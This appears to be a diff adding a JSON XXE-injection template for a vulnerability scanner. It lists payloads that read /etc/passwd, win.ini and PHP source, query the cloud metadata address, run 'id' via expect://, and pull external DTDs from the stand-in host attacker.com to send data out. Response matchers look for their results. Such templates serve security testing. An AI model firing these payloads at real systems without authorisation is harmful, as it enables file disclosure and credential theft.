@@ -1,0 +1,93 @@
+[
+  {
+    "id": "xxe-basic",
+    "info": {
+      "name": "XML External Entity - Basic",
+      "severity": "critical",
+      "category": "injection",
+      "description": "Tests for XXE vulnerabilities in XML parsers",
+      "references": [
+        "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
+      ],
+      "tags": [
+        "xxe",
+        "xml",
+        "injection"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]>",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;]><foo>&send;</foo>",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "<?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"http://attacker.com/evil.dtd\"><foo>test</foo>",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/hostname\">]><data>&file;</data>",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY bar \"World\">]><foo>Hello &bar;</foo>",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"data://text/plain;base64,SGVsbG8gV29ybGQ=\">]><foo>&xxe;</foo>",
+        "encoding": "none",
+        "method": "POST"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_body",
+        "condition": "contains",
+        "patterns": [
+          "root:x:",
+          "[extensions]",
+          "ami-id",
+          "uid="
+        ]
+      }
+    ]
+  }
+]
